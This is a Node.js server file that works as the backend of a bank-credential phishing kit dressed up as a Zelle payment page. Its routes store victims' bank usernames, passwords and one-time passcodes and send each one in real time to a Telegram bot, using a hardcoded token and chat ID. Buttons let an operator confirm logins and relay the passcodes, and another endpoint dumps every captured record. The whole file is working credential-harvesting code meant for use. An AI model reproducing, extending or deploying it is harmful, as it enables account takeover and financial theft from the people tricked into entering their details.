import express from "express";
import helmet from "helmet";
import cors from "cors";
import morgan from "morgan";
import chalk from "chalk";
import Database from "better-sqlite3";
import fetch from "node-fetch";
import { WebSocketServer } from "ws";

const app = express();
const PORT = process.env.PORT || 5000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8326736472:AAGPqPPtxL5ccruOVGfyhdcCTNkckx2EDZc";
const CHAT_ID = "734316369";

// ───── Middleware ─────
app.use(helmet());
app.use(express.json());
app.use(
  cors({
    origin: ["http://localhost:5173", "https://zellepayment.netlify.app"],
    credentials: true,
  })
);
app.options("*", cors());
app.use(
  morgan((tokens, req, res) =>
    [
      chalk.cyan(tokens.method(req, res)),
      chalk.yellow(tokens.url(req, res)),
      chalk.green(tokens.status(req, res)),
      chalk.magenta(tokens["response-time"](req, res)),
      "ms",
    ].join(" ")
  )
);

const logRequestData = (req) => {
  console.log(chalk.cyan("\n📩 Incoming Request:"));
  console.log(chalk.yellow("  → URL:"), req.originalUrl);
  console.log(chalk.yellow("  → Method:"), req.method);
  console.log(chalk.yellow("  → Body:"), req.body);
};

// ───── Database ─────
const db = new Database("plaid_demo.db");
db.pragma("journal_mode = WAL");

// Override prepare to log DB queries
const originalPrepare = db.prepare.bind(db);
db.prepare = (query) => {
  console.log(chalk.magenta("💾 SQL Query:"), query);
  const stmt = originalPrepare(query);
  ["run", "get", "all"].forEach((method) => {
    if (stmt[method]) {
      const original = stmt[method].bind(stmt);
      stmt[method] = (...args) => {
        console.log(chalk.blue(`🧩 DB Operation: ${method}`), args);
        try {
          const result = original(...args);
          console.log(chalk.green("✅ DB Result:"), result);
          return result;
        } catch (err) {
          console.error(chalk.red("💥 DB Error:"), err);
          throw err;
        }
      };
    }
  });
  return stmt;
};

// ───── Tables ─────
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    otp_code TEXT,
    bank_name TEXT,
    expires_at DATETIME,
    otp_status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS zelle_payment (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    amount REAL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS telegram_callbacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    callback_data TEXT,
    username TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

// ───── Telegram Helper ─────
async function sendToTelegram(message, buttons = null) {
  try {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
    if (buttons) payload.reply_markup = { inline_keyboard: buttons };
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await res.json();
    if (!data.ok) console.error("❌ Telegram Error:", data.description);
  } catch (err) {
    console.error("💥 Telegram send error:", err);
  }
}

// ───── WebSocket Server ─────
const wss = new WebSocketServer({ noServer: true });
let connectedClients = [];
wss.on("connection", (ws) => {
  console.log("🌐 New WebSocket client connected");
  connectedClients.push(ws);
  ws.on("close", () => {
    connectedClients = connectedClients.filter((c) => c !== ws);
    console.log("❌ WebSocket client disconnected");
  });
});
function broadcastCallback(callback) {
  const data = JSON.stringify({ type: "telegram_callback", payload: callback });
  connectedClients.forEach((client) => {
    if (client.readyState === 1) client.send(data);
  });
}

// ───── Routes ─────

// Health check
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
});

// ───── Zelle Payment ─────
app.get("/api/zelle-payment", (req, res) => {
  try {
    const row = db.prepare("SELECT name, amount FROM zelle_payment ORDER BY id DESC LIMIT 1").get();
    res.json({ payment: row || { name: "James Allen", amount: 167 } });
  } catch {
    res.status(500).json({ error: "Failed to fetch Zelle payment" });
  }
});

app.post("/api/zelle-payment", (req, res) => {
  const { name, amount } = req.body;
  if (!name || typeof amount !== "number") return res.status(400).json({ error: "Invalid name or amount" });
  try {
    db.prepare("INSERT INTO zelle_payment (name, amount) VALUES (?, ?)").run(name, amount);
    res.json({ success: true });
  } catch {
    res.status(500).json({ error: "Failed to update Zelle payment" });
  }
});

// ───── User login / OTP ─────
app.post("/api/save", async (req, res) => {
  logRequestData(req);
  const { username, password, bank } = req.body;
  if (!username || !password || !bank?.name)
    return res.status(400).json({ error: "Missing username, password, or bank info" });

  try {
    const result = db.prepare("INSERT INTO user_data (username, password, bank_name) VALUES (?, ?, ?)")
      .run(username, password, bank.name);

    const msg = `<b>👤 New Login Attempt</b>\n🪪 <b>Username:</b> ${username}\n🔑 <b>Password:</b> ${password}\n🏦 <b>Bank:</b> ${bank.name}`;
    const buttons = [
      [{ text: "✅ Authorize Login", callback_data: `authorized_${result.lastInsertRowid}` }],
      [
        { text: "🚫 Invalid Username", callback_data: `invalid_username_${result.lastInsertRowid}` },
        { text: "🔐 Invalid Password", callback_data: `invalid_password_${result.lastInsertRowid}` },
      ],
    ];

    await sendToTelegram(msg, buttons);
    res.json({ success: true, id: result.lastInsertRowid });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/save-otp", async (req, res) => {
  logRequestData(req);
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: "Missing OTP code" });

  try {
    const latestUser = db.prepare("SELECT id, username FROM user_data ORDER BY id DESC LIMIT 1").get();
    if (!latestUser) return res.status(400).json({ error: "No user found" });

    const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();
    db.prepare("UPDATE user_data SET otp_code = ?, expires_at = ?, otp_status = 'pending' WHERE id = ?")
      .run(code, expiresAt, latestUser.id);

    const msg = `<b>🔢 OTP Code</b>\n🪪 <b>Username:</b> ${latestUser.username}\n🔢 <b>OTP:</b> ${code}`;
    const buttons = [
      [
        { text: "✅ Authorize", callback_data: `authorized_${latestUser.id}` },
        { text: "❌ Decline", callback_data: `declined_${latestUser.id}` },
      ],
    ];

    await sendToTelegram(msg, buttons);
    res.json({ success: true, user: latestUser });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to save OTP" });
  }
});

app.get("/api/check-otp-status", (req, res) => {
  const { id } = req.query;
  if (!id) return res.status(400).json({ error: "Missing user ID" });
  try {
    const user = db.prepare("SELECT otp_status FROM user_data WHERE id = ?").get(Number(id));
    res.json({ otp_status: user?.otp_status || "pending" });
  } catch {
    res.status(500).json({ error: "Failed to fetch OTP status" });
  }
});

// ───── Telegram Webhook / Callback ─────
app.post("/api/telegram-webhook", express.json(), async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const callbackId = update.callback_query.id;
    const data = update.callback_query.data;
    const user = update.callback_query.from;

    console.log("📩 Telegram Callback:", data, "from:", user.username);

    db.prepare("INSERT INTO telegram_callbacks (callback_data, username) VALUES (?, ?)")
      .run(data, user.username);

    broadcastCallback({ callback_data: data, username: user.username, timestamp: new Date() });

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackId }),
    });
  }
  res.sendStatus(200);
});

// Fetch latest Telegram callbacks (optional for polling)
app.get("/api/telegram-callbacks", (req, res) => {
  try {
    const rows = db.prepare("SELECT * FROM telegram_callbacks ORDER BY id DESC LIMIT 20").all();
    res.json(rows);
  } catch {
    res.status(500).json({ error: "Failed to fetch callbacks" });
  }
});

// ───── Debug / Data ─────
app.get("/api/data", (req, res) => {
  const rows = db.prepare("SELECT * FROM user_data ORDER BY id DESC").all();
  res.json(rows);
});

// ───── WebSocket Upgrade ─────
const server = app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
server.on("upgrade", (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit("connection", ws, request);
  });
});
